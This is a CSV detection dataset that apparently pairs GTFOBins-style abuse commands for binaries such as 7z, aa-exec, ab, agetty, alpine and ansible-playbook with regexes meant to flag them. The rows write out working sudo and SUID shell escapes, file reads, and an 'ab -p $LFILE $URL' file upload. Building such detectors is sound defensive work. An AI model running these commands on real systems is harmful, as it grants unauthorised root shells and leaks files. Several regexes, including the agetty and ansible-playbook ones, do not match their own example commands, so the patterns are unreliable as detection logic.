Name,Function,ExampleCode,Regex,Notes
7z,file-read,7z a -ttar -an -so $LFILE | 7z e -ttar -si -so,"(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?7z\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
7z,sudo,sudo 7z a -ttar -an -so $LFILE | 7z e -ttar -si -so,"(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?7z\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
aa-exec,shell,aa-exec /bin/sh,(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?aa\-exec\s+(?:/bin/(?:sh|bash))),
aa-exec,suid,./aa-exec /bin/sh -p,(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?aa\-exec\s*\-p\s+(?:/bin/(?:sh|bash))),
aa-exec,sudo,sudo aa-exec /bin/sh,(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?aa\-exec\s+(?:/bin/(?:sh|bash))),
ab,file-upload,ab -p $LFILE $URL,"(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?ab\s*\-p\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",Upload local file via HTTP POST request.
ab,file-download,ab -v2 $URL,"(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?ab\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",Fetch a remote file via HTTP GET request. The response is returned as part of the verbose output of the program with some limitations on the length.
ab,suid,./ab -p $LFILE $URL,"(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?ab\s*\-p\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",Upload local file via HTTP POST request.
ab,sudo,sudo ab -p $LFILE $URL,"(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?ab\s*\-p\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",Upload local file via HTTP POST request.
agetty,suid,./agetty -o -p -l /bin/sh -a root tty,(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?agetty\s*\-o\s*\-p\s*\-l\s*\-a\s+(?:/bin/(?:sh|bash))),
alpine,file-read,"alpine -F ""$LFILE""","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?alpine\s*\-F\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
alpine,suid,"./alpine -F ""$LFILE""","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?alpine\s*\-F\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
alpine,sudo,"sudo alpine -F ""$LFILE""","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?alpine\s*\-F\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
ansible-playbook,shell,"echo '[{hosts: localhost, tasks: [shell: /bin/sh </dev/tty >/dev/tty 2>/dev/tty]}]' >$TF
ansible-playbook $TF","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?ansible\-playbook\s+(?:/bin/(?:sh|bash)).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
ansible-playbook,sudo,"echo '[{hosts: localhost, tasks: [shell: /bin/sh </dev/tty >/dev/tty 2>/dev/tty]}]' >$TF
sudo ansible-playbook $TF","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?ansible\-playbook\s+(?:/bin/(?:sh|bash)).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
